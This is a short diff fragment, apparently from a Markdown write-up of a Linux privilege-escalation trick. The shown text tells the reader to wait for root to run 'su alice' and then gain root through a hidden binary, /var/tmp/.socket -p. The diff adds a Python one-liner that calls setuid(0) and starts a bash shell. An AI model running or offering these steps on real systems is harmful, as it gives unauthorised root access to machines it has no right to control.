@@ -20,6 +20,9 @@ Wait for ROOT to execute 'su alice' and thereafter gain root with:
 /var/tmp/.socket -p
 ```
 
+```
+python3 -c "import os;os.setuid(0);os.execl('/bin/bash', '-bash')"
+```
 ---
 
 ## Technical: Read the source.  
